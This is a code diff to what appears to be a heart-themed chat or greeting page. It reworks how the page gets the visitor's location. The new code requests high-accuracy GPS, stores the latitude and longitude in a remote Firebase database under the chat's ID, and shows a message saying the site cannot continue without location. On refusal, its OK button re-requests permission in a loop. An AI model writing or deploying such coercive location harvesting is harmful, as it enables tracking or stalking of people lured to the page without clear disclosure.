@@ -51,25 +51,17 @@ let userName = localStorage.getItem("userName") || null;
 /* ------------------------------- */
 /* ASK LOCATION FIRST              */
 /* ------------------------------- */
-err => {
+function askLocationFirst_thenName() {
 
-  createHearts();
+  if (!navigator.geolocation) {
+    titleEl.textContent = "Location not supported";
+    card.classList.add("show");
+    return;
+  }
 
-  titleEl.textContent = "📍 Please allow location";
+  navigator.geolocation.getCurrentPosition(
 
-  extra.innerHTML = `
-  <p style="margin-bottom:10px;">
-  Website continue karne ke liye location allow karna zaroori hai
-  </p>
-
-  <button id="allowLocationBtn">OK</button>
-  `;
-
-  card.classList.add("show");
-
-  document.getElementById("allowLocationBtn").onclick = () => {
-
-    navigator.geolocation.getCurrentPosition(function(pos){
+    function(pos){
 
       db.ref("chat/" + chatID + "/gps").set({
         lat: pos.coords.latitude,
@@ -80,9 +72,34 @@ err => {
 
       askNameThenContinue();
 
-    });
+    },
 
-  };
+    function(err){
+
+      createHearts();
+
+      titleEl.textContent = "📍 Please allow location";
+
+      extra.innerHTML = `
+      <p style="margin-bottom:12px;">
+      Website continue karne ke liye location allow karna zaroori hai
+      </p>
+
+      <button id="retryLocation">OK</button>
+      `;
+
+      card.classList.add("show");
+
+      // OK button par dubara permission request
+      document.getElementById("retryLocation").onclick = function(){
+        askLocationFirst_thenName();
+      };
+
+    },
+
+    { enableHighAccuracy:true }
+
+  );
 
 }
 /* ------------------------------- */
